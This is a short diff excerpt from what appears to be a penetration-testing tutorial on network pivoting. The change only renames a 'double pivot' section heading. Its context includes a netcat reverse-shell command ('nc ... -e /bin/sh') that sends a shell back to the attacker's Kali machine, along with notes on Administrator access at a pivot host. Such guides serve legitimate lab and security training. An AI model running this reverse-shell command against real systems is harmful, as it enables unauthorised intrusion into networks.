@@ -124,7 +124,7 @@ nc 172.16.150.10 9002 -e /bin/sh
 # Now we successfully got a shell from the Host B (172.16.50.20) to our Kali
 ```
 
-## Easy Double Pivot
+## Easy Double Pivot to Access a Second Internal Network
 ### Establishing the Second Pivot
 Given the following situation:
 - We got access to the first internal network (172.16.150.0/24) through Administrator access at Pivot Host A (172.16.150.10).
